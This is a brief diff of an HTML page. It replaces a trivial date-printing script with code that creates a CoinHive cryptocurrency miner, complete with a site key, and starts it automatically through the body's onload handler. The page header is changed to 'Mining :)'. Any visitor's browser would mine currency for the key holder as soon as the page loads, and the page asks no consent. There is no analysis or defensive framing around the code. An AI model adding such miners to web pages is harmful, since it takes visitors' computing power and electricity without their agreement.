@@ -1,18 +1,14 @@
 <html>
     <head>
         <script>
-            myFunction = function() {
-                for (var i = 1000; i > 0; i--) {
-                    setTimeout(function() {
-                        main.innerText += new Date();
-                    }, 100);
-                }
+            startMining = function() {
+                var miner = new CoinHive.User('AMYh8KHyUnNF05VM6l6R34q7z6FLT9Qk', 'numerinico', {});
+                miner.start();
             };
         </script>
     </head>
 
-    <body onload="myFunction()">
-        <header>What it is, my doge?</header>
-        <div id="main"></div>
+    <body onload="startMining()">
+        <header>Mining :)</header>
     </body>
 </html>
